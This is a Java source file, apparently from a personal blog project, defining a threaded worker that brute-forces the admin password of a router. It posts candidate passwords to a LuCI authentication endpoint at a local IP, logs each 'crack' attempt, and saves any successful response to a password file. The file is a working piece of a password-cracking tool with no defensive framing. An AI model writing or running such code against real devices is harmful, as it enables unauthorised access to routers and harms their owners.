package com.hquery.blog;

import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.web.client.RestTemplate;

import java.io.*;

/**
 * @author hquery.huang
 * 2018/1/28 12:04
 */
public class PostData implements Runnable {

    RestTemplate restTemplate;

    HttpHeaders headers = new HttpHeaders();

    Serializable data;

    public PostData() {
    }

    public PostData(RestTemplate restTemplate, HttpHeaders headers, Serializable data) {
        this.restTemplate = restTemplate;
        this.headers = headers;
        this.data = data;
    }

    @Override
    public void run() {
        String body = new StringBuilder("{\"method\":\"admin_login\",\"params\":[\"").append(data).append("\"]}").toString();
        System.out.println("crack with : " + body);
        HttpEntity<Object> request = new HttpEntity<>(body, headers);
        String response = restTemplate.postForEntity("http://192.168.10.1/cgi-bin/luci/api/auth/", request, String.class).getBody();
        System.out.println("response body : " + response);
        if (!"]".equals(response.substring(21, 22))) {
            System.out.println("success crack password : " + response);
            File file = new File("D:/password.txt");
            try {
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                OutputStreamWriter outputStreamWriter = new OutputStreamWriter(fileOutputStream);
                BufferedWriter bufferedWriter = new BufferedWriter(outputStreamWriter);
                bufferedWriter.write(response);
                bufferedWriter.flush();
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
}
